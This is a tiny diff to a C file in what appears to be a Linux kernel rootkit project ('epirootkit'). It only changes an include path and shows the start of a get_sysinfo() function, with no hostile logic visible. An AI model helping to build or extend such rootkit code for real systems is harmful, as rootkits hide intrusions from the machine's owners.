@@ -6,7 +6,7 @@
 #include <linux/string.h>
 
 #include "epirootkit.h"
-#include "utils/sysinfo.h"
+#include "sysinfo.h"
 #include "vanish.h"
 
 char* get_sysinfo(void) {
